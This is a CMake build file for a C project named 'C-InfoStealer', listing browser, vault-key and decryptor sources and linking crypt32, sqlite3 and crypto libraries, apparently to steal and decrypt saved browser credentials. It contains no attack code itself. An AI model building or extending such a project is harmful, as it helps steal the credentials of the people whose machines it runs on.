cmake_minimum_required(VERSION 3.5)
project(C-InfoStealer)

set(CMAKE_C_STANDARD 11)

set(SOURCE_FILES
    src/vaultkey.c
    src/_strcat.c
    src/browser.c
    src/copy.c
    src/decryptor.c
    src/main.c
)

set(EXECUTABLE_OUTPUT_PATH "${CMAKE_CURRENT_SOURCE_DIR}/dll")

include_directories(include)

link_directories(lib)

add_executable(main ${SOURCE_FILES} ${HEADER_FILES})

target_link_libraries(main ssl cjson crypto crypt32 sqlite3)

set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -Wextra -Wall -Werror")
